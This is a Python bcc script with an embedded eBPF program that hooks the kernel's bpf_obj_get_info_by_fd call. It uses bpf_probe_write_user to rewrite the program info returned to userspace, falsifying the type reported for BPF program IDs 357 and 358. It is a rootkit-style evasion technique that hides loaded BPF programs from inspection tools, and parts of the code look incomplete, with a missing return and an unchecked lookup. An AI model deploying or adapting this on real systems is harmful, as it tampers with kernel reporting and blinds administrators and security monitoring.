from bcc import BPF

# define BPF program
prog = """
#include <linux/kernel.h>
#include <linux/string.h>

struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
	unsigned long r15;
	unsigned long r14;
	unsigned long r13;
	unsigned long r12;
	unsigned long bp;
	unsigned long bx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
	unsigned long r11;
	unsigned long r10;
	unsigned long r9;
	unsigned long r8;
	unsigned long ax;
	unsigned long cx;
	unsigned long dx;
	unsigned long si;
	unsigned long di;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
	unsigned long orig_ax;
/* Return frame for iretq */
	unsigned long ip;
	unsigned long cs;
	unsigned long flags;
	unsigned long sp;
	unsigned long ss;
/* top of stack page */
};

BPF_HASH(map);

int get_uinfo_addr(struct pt_regs *ctx) {
    union bpf_attr *attr = (union bpf_attr *) PT_REGS_PARM1(ctx);
    union bpf_attr uattr;
    memset(&uattr, 0, sizeof(uattr));
    bpf_probe_read(&uattr, 16, attr);

    u64 pid = bpf_get_current_pid_tgid();
    map.update(&pid, &uattr.info.info);
    return 0;
}

int clear_uinfo(struct pt_regs *ctx) {
    u64 pid = bpf_get_current_pid_tgid();
    u64 *uinfo_addr = map.lookup(&pid);
    u64 uinfo;
    bpf_probe_read(&uinfo, 8, uinfo_addr);
    if (uinfo == 0) return 0;

    struct bpf_prog_info replace;
    memset(&replace, 0, sizeof(replace));
    bpf_probe_read_user(&replace, sizeof(replace), (unsigned long *) uinfo);
    if (replace.id == 357 || replace.id == 358) replace.type = 8; 

    bpf_probe_write_user((unsigned long *) uinfo, &replace, sizeof(replace));
}
"""

# load BPF program
b = BPF(text=prog)
b.attach_kprobe(event="bpf_obj_get_info_by_fd", fn_name="get_uinfo_addr")
b.attach_kretprobe(event="bpf_obj_get_info_by_fd", fn_name="clear_uinfo")

# header
print("%-18s %-16s %-6s %s" % ("TIME(s)", "COMM", "PID", "MESSAGE"))

# format output
while 1:
    try:
        (task, pid, cpu, flags, ts, msg) = b.trace_fields()
    except ValueError:
        continue
    print("%-18.9f %-16s %-6d %s" % (ts, task, pid, msg))
